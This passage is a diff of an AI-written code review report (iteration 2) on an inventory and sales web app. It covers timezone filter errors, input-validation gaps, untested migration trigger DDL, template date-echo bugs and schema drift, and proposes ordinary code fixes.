+or a clipped fourth select. This was flagged as a deferred item in `33-CONTEXT.md`
+§ Deferred Ideas and was never checked.
+
+**Fix:** one line, purely additive (no `.filter-bar` currently relies on nowrap):
+
+```css
+.filter-bar {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 16px;
+  align-items: flex-end;
+  margin-bottom: 24px;
+}
 ```
 
-The two rules must agree — the backfill's whole correctness argument is that
-`business_date == local_day(created_at)` for every historical row. As written, on a
-server whose OS zone is not `display_tz`, a naive `created_at` produces a wrong
-`local_day` and therefore a spurious (or missing) «задним числом» marker.
+### WR-09: «Только в день операции» still under-includes rows in the UTC-straddle window (behavioural half of prior WR-05, unfixed)
 
-**Fix:** apply the migration's own rule:
+**Severity:** WARNING
+**Files:** `app/services/operations.py:96-116` (the new «ACCEPTED CONSEQUENCE — BOTH DIRECTIONS» block), `:313-330` (the `same_day` predicate)
 
-```python
-moment = datetime.fromisoformat(op.created_at)
-if moment.tzinfo is None:
-    moment = moment.replace(tzinfo=UTC)
-local_day = moment.astimezone(tz).date().isoformat()
-```
-
-### WR-05: «Только в день операции» silently omits normal rows entered in the UTC-straddle window
-
-**File:** `app/services/operations.py:265-285` (with the trade-off note at `:73-105`)
-
-**Issue:** the docstring states the accepted cost in one direction only —
-«Только задним числом» may return an unmarked row, "the converse never happens, so
-no marked row is ever lost". The *other* filter has the mirror-image defect and it
-is not stated: a row entered at 00:30 Europe/Moscow has
-`business_date = 2026-09-05` and `substr(created_at,1,10) = 2026-09-04`, so
-
-```python
-Operation.business_date == entry_day_utc   # "2026-09-05" == "2026-09-04" -> False
-```
-
-excludes it from «Только в день операции» even though the UI renders it with **no**
-marker, i.e. as an ordinary same-day row. At `Europe/Moscow` that is every row
-entered between 00:00 and 03:00 local — a genuinely wrong answer to the operator's
-question, not a cosmetic mismatch, and `tests/test_history.py::
-test_backdated_filter_and_marker_diverge_only_on_utc_straddle` pins the behaviour
-without contradicting the claim, because the claim only covers one side.
-
-**Fix:** either state it (update the docstring and the UI copy so
-«Только в день операции» reads as an approximation), or make the predicate exact by
-comparing against a stored marker rather than a UTC-derived one. A minimal honest
-fix is to widen `same_day` to also accept the neighbouring UTC day:
+**Issue:** iteration 1 closed the *documentation* half of this finding — the docstring
+now states both directions accurately and the `history_view` branch points at it. The
+*behaviour* is unchanged and is re-reported here so it stays on the ledger rather than
+disappearing into a docstring:
 
 ```python
 dated_where = (
     or_(
         Operation.business_date.is_(None),
-        Operation.business_date == entry_day_utc,
-        # the local day may legitimately be entry_day_utc + 1 east of Greenwich
-        Operation.business_date == func.substr(Operation.created_at, 1, 10),
+        Operation.business_date == entry_day_utc,   # substr(created_at, 1, 10)
     ),
 )
 ```
-— but note this changes the `backdated`/`same_day` complementarity, so pick the
-approach with the operator and pin whichever is chosen.
 
-### WR-06: `register_receipt`'s quantity guard is missing the `isascii()` check its four siblings have
+At `Europe/Moscow` every row entered between 00:00 and 03:00 local has
+`business_date = D+1` and `substr(created_at,1,10) = D`, so the equality fails and the
+row is **excluded** from «Только в день операции» — even though `_is_backdated`
+renders it with no marker, i.e. as an ordinary same-day row. The operator asking
+«show me only the ones entered on the day» gets a wrong answer, silently, for a
+predictable 3-hour slice of every day's entries.
 
-**File:** `app/services/receipts.py:119`
+**Fix:** this is genuinely an operator/spec decision, not a local edit, and the fixer
+was right not to pick unilaterally. The two options, unchanged:
 
-**Issue:**
+- **Relabel** — change the option copy so it reads as an approximation. That is an
+  edit to `33-UI-SPEC.md` § Copywriting Contract, which carries an explicit
+  «Copy that must NOT be written» clause.
+- **Widen the predicate** to also accept the neighbouring UTC day. This breaks the
+  `backdated`/`same_day` complementarity (a row could satisfy both) and reddens
+  `tests/test_history.py::test_backdated_filter_and_marker_diverge_only_on_utc_straddle`,
+  which pins today's behaviour on purpose.
 
-```python
-qty = int(qty_text) if qty_text.isdigit() else 0
-```
+**Recommended next step:** ask the operator which of the two answers they want, in the
+same pass as WR-01's floor question (both are copy + spec changes to the same phase's
+UI-SPEC). Until then this stays open; do not close it by editing the docstring again.
 
-`"²".isdigit()` is `True` and `int("²")` raises `ValueError`. Every sibling service
-was hardened for exactly this and says so in a comment —
-`writeoffs.py:71`, `transfers.py:84`, `sales.py:148`, `returns.py:144` all read
-`qty_text.isascii() and qty_text.isdigit()`. Receipts was left behind. Both receipt
-routes wrap the call in `except Exception` (`routes/receipts.py:247`,
-`mobile_receipts.py:276`), so the user-visible result is not a 500 — it is the wrong
-message («Не удалось сохранить. Попробуйте ещё раз.» instead of the precise quantity
-error) plus a spurious `logger.exception` stack trace for what is ordinary bad input.
-This phase edited this function; the inconsistency is now the odd one out of five.
-
-**Fix:**
-
-```python
-qty = int(qty_text) if qty_text.isascii() and qty_text.isdigit() else 0
-```
-
-### WR-07: `register_sale` can raise `StopIteration` on an unresolvable warehouse
-
-**File:** `app/services/sales.py:215-220`
-
-**Issue:**
-
-```python
-warehouse_ids = {line["batch"].warehouse_id for line in resolved}
-warehouses = session.scalars(select(Warehouse).where(Warehouse.id.in_(warehouse_ids))).all()
-basket_currencies = {warehouse.currency for warehouse in warehouses}
-if len(basket_currencies) > 1:
-    return None, {"basket": MIXED_CURRENCY_ERROR}
-basket_currency = next(iter(basket_currencies))
-```
-
-`len(...) > 1` catches the mixed case but not the empty one. If the `SELECT` returns
-nothing (a batch pointing at a warehouse row that is absent — possible on a merged
-DB, since `Batch.warehouse_id`'s FK is ORM-only on the merge path and `PRAGMA
-foreign_keys` is only set for SQLite connections), `next(iter(set()))` raises
-`StopIteration` outside every `try` in this function. The desktop sale route has no
-blanket `except Exception`, so this is a raw 500 mid-checkout.
-
-**Fix:**
-
-```python
-if len(basket_currencies) > 1:
-    return None, {"basket": MIXED_CURRENCY_ERROR}
-if not basket_currencies:
-    return None, {"basket": SAVE_ROLLBACK}
-basket_currency = next(iter(basket_currencies))
-```
-
-### WR-08: the downgrade trigger DDL is asserted against nothing
-
-**Files:** `tests/test_migrations.py:72-95`;
-`alembic/versions/0027…py:213-289` (`_SQLITE_DOWNGRADE_DDL` / `_PG_DOWNGRADE_DDL`)
-
-**Issue:** `test_alembic_head_triggers_match_app_db` compares the live triggers to
-`APPEND_ONLY_TRIGGERS` **as a whole name → DDL map**, and its docstring explains
-that comparing names alone would miss "a trigger present under the right name but
-guarding the wrong column list". Its sibling then does exactly that:
-
-```python
-assert set(_live_triggers(alembic_engine)) == set(_TRIGGER_NAMES)   # names only
-```
-
-and it asserts *after* re-upgrading to head, so the state it inspects is produced by
-`_SQLITE_DDL`, not by `_SQLITE_DOWNGRADE_DDL`. Consequence: the ~80 lines of
-hand-copied downgrade DDL — the half that has to reproduce 0018's and 0026's exact
-`WHEN` enumerations — are covered by no assertion at all. A typo there (a dropped
-`OR NEW.currency`, say) leaves a downgraded DB with a silently weaker cash guard and
-every test stays green. That is the same class of drift migration 0026 exists to fix.
-
-**Fix:** snapshot the map at the downgraded revision, before re-upgrading:
-
-```python
-run_alembic(url, "downgrade", "-1")
-downgraded = _live_triggers(alembic_engine)
-assert set(downgraded) == set(_TRIGGER_NAMES)
-assert "business_date" not in downgraded["operations_no_update"]
-assert "NEW.currency" in downgraded["cash_movements_no_update"]   # 0026's guard survives
-run_alembic(url, "upgrade", "head")
-assert _live_triggers(alembic_engine) == {
-    re.search(r"CREATE TRIGGER (\w+)", t).group(1): _normalise(t) for t in APPEND_ONLY_TRIGGERS
-}
-```
+---
 
 ## Info
 
-### IN-01: `local_day_bounds_utc` has no production caller left
+### IN-01: `local_day_bounds_utc` has no production caller and the docstring does not say so
 
-**File:** `app/core.py:108-131`
+**File:** `app/core.py:119-135`
 
-Every `app/` reference is now a docstring cross-reference (`app/core.py:139,149`,
-`app/services/export.py:233`); the only live callers are `tests/test_export.py:27,253`
-and `tests/test_business_date.py:96,111`. It is retained deliberately (its docstring
-is load-bearing documentation for the `business_date_bounds` contrast, and tests
-build `created_at` fixtures with it), so this is a note, not a removal request —
-but a reader will assume it is on a live path. Add one line to the docstring saying
-it is now fixture/documentation-only.
+The docstring now correctly calls it "the `created_at`-only helper" and contrasts it
+with `business_date_bounds`, but it never says the thing a reader needs: every `app/`
+reference is a docstring cross-reference (`core.py:124,150,160`,
+`export.py:233`), and the only live callers are `tests/test_core.py:108-150`,
+`test_export.py:253`, `test_business_date.py:97,112` and `test_dashboard.py:231,235`.
+It is retained deliberately (its docstring is load-bearing documentation and tests use
+it to build `created_at` fixtures), so this is a note, not a removal request.
 
-### IN-02: `POST /m/transfers/step/dest` is unreachable
+**Fix:** one sentence in the docstring — "As of Phase 33 this helper has NO caller
+under `app/`; it is kept as fixture-building machinery for `tests/` and as the
+documented contrast for `business_date_bounds`."
+
+### IN-02: `POST /m/transfers/step/dest` is unreachable and would drop a typed date if it were wired up
 
 **File:** `app/routes/mobile_transfers.py:184-209`
 
-No template posts to it (the dest step is entered only via
-`GET /m/transfers/step/batch-pick`); the only callers are three tests. Already
-recorded in `33-12-SUMMARY.md:59`. It is also the one `_render_dest_step` caller that
-does not accept `op_date`, so if it were ever wired up it would silently reset a
+No template posts to this route — the dest step is entered only via
+`GET /m/transfers/step/batch-pick` (`:164-181`) — and its only callers are three
+tests. Already recorded in `33-12-SUMMARY.md:59`. It is also the one
+`_render_dest_step` caller that does not accept or forward `op_date` (contrast
+`:248-262`, `:267-280`, `:283-297`), so wiring it up later would silently reset a
 typed back-date to today.
 
-### IN-03: `business_date` has no DB-level format constraint
+**Fix:** either delete the route, or add `op_date: str = Form("")` and thread it, so
+the omission cannot become a bug when someone connects it.
 
-**Files:** `app/models.py:420`, `:587`;
-`alembic/versions/0027…py:342-347`
+### IN-03: `business_date` (and `created_at`) have no DB-level shape constraint
 
-`String(10)` is not enforced by SQLite at all, and a `CHECK (business_date IS NULL OR
-business_date GLOB '[0-9][0-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9]')` would be the
-defence-in-depth backstop for CR-01 that survives any future write path. Worth
-considering for the follow-up revision (it cannot be added to 0027 retroactively).
+**Files:** `app/models.py:412` (`created_at`), `:420`, `:587` (`business_date`); `alembic/versions/0027…py:341-347`
 
-### IN-04: an invalid `op_date` is echoed back into `<input type="date">`, which blanks it
+`String(10)` / `String(32)` are not enforced by SQLite at all. A
+`CHECK (business_date IS NULL OR business_date GLOB '[0-9][0-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9]')`
+would be the defence-in-depth backstop behind CR-01's parse gate that survives any
+future write path. It cannot be added to 0027 (already applied on s1) and needs its
+own revision — which is also the natural home for the `created_at` repair CR-01
+identifies (a poisoned pre-0027 row cannot be fixed by intake validation alone).
 
-**Files:** `app/templates/partials/receipt_form.html:110`, `correction_form.html:113`,
-`sale_form.html:107`, `transfer_form.html:83`, `writeoff_form.html:97`,
-`withdraw_form.html:87`, `deposit_form.html:73`
+### IN-04: an invalid `op_date` is echoed back into `<input type="date">`, which blanks it — and the resubmit then silently books today
 
-`value="{{ form.op_date or today_iso() }}"` echoes the raw submitted string. On the
-`OP_DATE_FORMAT_ERROR` path that string is by definition not an ISO date, and a
-browser silently renders `<input type="date" value="31.12.2026">` as empty — so
-re-submitting posts `""`, which means «today» and writes a row with no error at all.
-The error message and the resulting write disagree. `33-SECURITY.md` R2 already notes
-the "value is normalised" claim is false; this is its user-visible consequence.
-Echo the value only when `parse_op_date` accepted it, or fall back to `today_iso()`
-whenever `errors.op_date` is set.
+**Files:** `app/templates/partials/receipt_form.html:110`, `sale_form.html:107`, `correction_form.html:113`, `transfer_form.html:83`, `writeoff_form.html:97`, `withdraw_form.html:87`, `deposit_form.html:73` (all `value="{{ form.op_date or today_iso() }}"`); `return_form.html:63`, `mobile_partials/return_confirm.html:65`, `transfers_step_dest.html:98` (all `value="{{ op_date | default(today_iso(), true) }}"`); `corrections_step_value.html:68`
+
+Unchanged from iteration 1. On the `OP_DATE_FORMAT_ERROR` path the echoed string is by
+definition not an ISO date, and a browser silently renders
+`<input type="date" value="31.12.2026">` as **empty**. Re-submitting posts `""`, which
+`parse_op_date` treats as «today» and writes with no error at all — the error message
+and the resulting write disagree. `33-SECURITY.md` R2 already notes the "value is
+normalised" claim is false; this is its user-visible consequence.
+
+**Fix:** fall back to today whenever the field itself errored, so the input can never
+render blank after a format error:
+
+```jinja
+value="{{ today_iso() if errors.op_date else (form.op_date or today_iso()) }}"
+```
+
+Apply the same shape to the four flat-`op_date` templates. Note the future-date path is
+unaffected (a future date IS valid ISO and re-renders correctly).
 
 ### IN-05: unbounded `getattr` dispatch in the Alembic test helper
 
 **File:** `tests/conftest.py:80`
 
-`getattr(command, args[0])(config, *args[1:])` will call any attribute of
-`alembic.command`. Test-only and low risk, but an explicit allow-list
-(`{"upgrade": command.upgrade, "downgrade": command.downgrade}[args[0]]`) is the same
-number of lines and fails loudly on a typo instead of raising `TypeError` deep inside
-Alembic.
+```python
+getattr(command, args[0])(config, *args[1:])
+```
+
+Will call any attribute of `alembic.command`. Test-only and low risk, but an explicit
+allow-list is the same number of lines and fails loudly on a typo instead of raising
+`TypeError` deep inside Alembic:
+
+```python
+{"upgrade": command.upgrade, "downgrade": command.downgrade}[args[0]](config, *args[1:])
+```
 
 ### IN-06: four near-identical period resolvers
 
-**Files:** `app/routes/reports.py:39-90`, `app/routes/history.py:24-81`,
-`app/routes/mobile_history.py:37-65`, plus `_metrics_context` duplicated between
-`app/routes/finance.py:78-108` and `app/routes/mobile_finance.py`
+**Files:** `app/routes/reports.py:39-90`, `app/routes/history.py:24-81`, `app/routes/mobile_history.py:37-65`, plus `_metrics_context` duplicated between `app/routes/finance.py:78-108` and `app/routes/mobile_finance.py`, plus `app/services/dashboard.py:119-123`
 
-The Monday-start-week / calendar-month boundary arithmetic now exists in five places
-(including `app/services/dashboard.py:119-123`, which replicates it deliberately and
-says so). Each copy is documented as intentional, and this phase did not create the
-duplication — but it did have to touch four of the five to switch to
-`business_date_bounds`, which is precisely the maintenance cost the duplication
-imposes. Worth scheduling a shared `period.py` helper before the next phase touches
-period logic.
+The Monday-start-week / calendar-month boundary arithmetic now exists in five places,
+each documented as intentional. This phase did not create the duplication, but it had
+to touch four of the five to switch to `business_date_bounds` — which is exactly the
+maintenance cost the duplication imposes. Worth scheduling a shared `period.py` helper
+before the next phase touches period logic.
+
+### IN-07: `_REVISION_ID_RE` uses `\d`, which matches non-ASCII digits, so the 409 detail can still echo attacker-chosen characters
+
+**File:** `app/routes/sync.py:65`; same pattern at `tests/test_migrations.py:153,163`
+
+```python
+_REVISION_ID_RE = re.compile(r"\d{4}")
+```
+
+Python's `\d` is Unicode-aware by default, so `"١٢٣٤"` (Arabic-Indic) and `"١٢٣٤"`-class
+strings `fullmatch`. The WR-03 fix's comment says the value is shown "only when it has
+the exact shape of an Alembic revision id", and Alembic revision ids are ASCII. The
+practical impact is tiny — `fullmatch` bounds the echo to exactly 4 characters, so
+there is no amplification — but it is still an untrusted echo the comment says does
+not happen.
+
+**Fix:** `re.compile(r"[0-9]{4}")` in both files.
+
+### IN-08: `reverses_*_id` carry an ORM `ForeignKey` that migration 0027 does not create, so test fixtures enforce a constraint production does not have
+
+**Files:** `app/models.py:398-401`, `:562-567`; `alembic/versions/0027…py:47-51`, `:343`, `:346`
+
+0027 adds both reversal-link columns as bare native columns and states the intent
+explicitly:
+
+> the bare native column means a reversal whose target has not arrived yet renders as a
+> dangling link instead of rolling back an entire push
+
+That is true on an Alembic-built database (production, s1). It is **false** on every
+test fixture: `tests/conftest.py:30` builds schema with `Base.metadata.create_all`,
+which emits the `REFERENCES operations(id)` clause from the ORM `ForeignKey`, and
+`app/db.py:128` sets `PRAGMA foreign_keys=ON`. So a Phase-34 test that pushes a
+reversal whose target has not arrived will raise `IntegrityError` in the suite while
+succeeding in production — the opposite of the documented contract, and in the
+direction that produces a false red rather than a false green (which is the better
+direction, but still a divergence worth knowing before Phase 34 writes these columns).
+
+This follows the pre-existing `sale_id`/`batch_id`/`author_id` precedent and is not a
+defect this phase introduced; it is recorded so Phase 34 does not debug it from
+scratch. Either drop the ORM `ForeignKey` on the two reversal columns (losing merge
+insert-ordering) or add the FK in the follow-up revision — but pick one before
+building a test around the dangling-link behaviour.
 
 ---
 
 ## Coverage notes (what was read deeply vs. lightly)
 
-**Read in full and traced:** `app/services/ledger.py`, `corrections.py`,
-`operations.py`, `reports.py`, `finance_reports.py`, `finance.py`, `export.py`,
-`sales.py`, `returns.py`, `receipts.py`, `writeoffs.py`, `transfers.py`,
-`dashboard.py`, `sync.py`, `sync_client.py` (targeted), `app/core.py`,
-`app/models.py`, `app/db.py`, `app/routes/__init__.py`, `sync.py`, `history.py`,
-`mobile_history.py`, `reports.py`, `finance.py` (+ mobile twin, targeted),
-`returns.py`, `corrections.py` (POST path), `receipts.py` / `mobile_receipts.py`
-(POST path), `mobile_transfers.py`, and the full 0027 migration.
-`app/services/merge.py` was read despite being outside the supplied file list,
-because CR-01 could not be proven without it.
+**Read in full and traced this iteration:** `app/core.py`, `app/db.py`,
+`app/models.py` (the four new columns + `Batch.expiry`), `app/routes/__init__.py`,
+`app/services/merge.py` (again — CR-01/WR-02/WR-03 all live there),
+`app/services/sync.py`, `app/routes/sync.py`, `app/services/ledger.py`,
+`operations.py`, `reports.py`, `export.py`, `finance.py`, `finance_reports.py`,
+`receipts.py`, `sales.py`, `returns.py`, `transfers.py`, `writeoffs.py`,
+`corrections.py`, `app/routes/history.py`, `mobile_history.py`, `returns.py`,
+`transfers.py`, `mobile_transfers.py`, the full 0027 migration,
+`tests/test_migrations.py`, `tests/conftest.py:1-120`, and the fixed regions of
+`tests/test_history.py`.
 
-**Read at the relevant hunks only:** `app/services/customers.py` (the `_spend_stmt`
-/ `last_order_date` block), `app/services/warehouses.py` (the `last_receipt`
-aggregate), `app/main.py` (the auto-sync backoff), `app/static/style.css` (the single
-`.field.op-date` rule), and the mobile route files that only thread `op_date` through
-to an already-reviewed service (`mobile_sales.py`, `mobile_writeoff.py`,
-`mobile_corrections.py`, `mobile_returns.py`, `mobile_finance.py`).
+**Read at the relevant hunks only:** `app/services/customers.py`
+(`_spend_stmt`/`last_order_date`), `warehouses.py` (`last_receipt`), `dashboard.py`
+(`period_metrics`), `sync_client.py` (`format_sync_message`, the 409 branch),
+`app/main.py` (`_auto_sync_iteration` backoff), `app/routes/finance.py` (report + CSV
+routes), `app/routes/sales.py` (POST path), and every `op_date` occurrence across
+`app/routes/` and `app/templates/` via targeted grep.
 
-**Deprioritised (scanned, not line-by-line audited):** all 30 `tests/*` files except
-`test_migrations.py`, `test_append_only_cursor.py`, `tests/conftest.py` and the first
-200 lines of `test_business_date.py`, which were read in full because WR-08 and the
-CR-01 gap are about what the suite does and does not assert. The remaining test files
-were sampled via grep for the assertions the SUMMARY artifacts cite; no finding below
-BLOCKER rests on them. `app/routes/customers.py` and `app/templates/mobile_pages/
-history.html`, `writeoff.html`, `mobile_partials/writeoff_step_reason.html`,
-`return_confirm.html`, `corrections_step_value.html`, `customer_insights.html`,
-`deposit_form.html`, `withdraw_form.html` were checked only for the `op_date` /
-`| ru_date` render shape (via grep + the two representative full reads of
-`history_rows.html` and `sale_basket.html`), not audited as whole files.
+**Scanned, not line-by-line audited:** the remaining `tests/*` files. WR-07 is the
+only finding resting on test code, and it was read in full.
 
-**Not verified by execution:** nothing in this review was run. The suite was not
-executed (`не запускал`); to confirm CR-01 the reproducer is
-`uv run pytest tests/test_merge.py -q` after adding a record with
-`"business_date": "не дата"` and then rendering `/history`.
+**Executed:** one thing only — `iso_to_local` was run against `"не дата"` and against a
+naive timestamp to prove CR-01 rather than assert it. Output is quoted verbatim in
+that finding. The suite was **NOT** run (`не запускал`). To confirm CR-01 end-to-end:
+insert an `Operation` with `created_at="не дата"` via a merge-shaped bulk insert (the
+fixture shape already exists at `tests/test_business_date.py:601-628`) and request
+`/history` and `/export/sales.csv`.
 
 ---
 
-_Reviewed: 2026-09-04T12:00:00Z_
+_Reviewed: 2026-09-05_
 _Reviewer: Claude (gsd-code-reviewer)_
 _Depth: standard_
+_Iteration: 2_
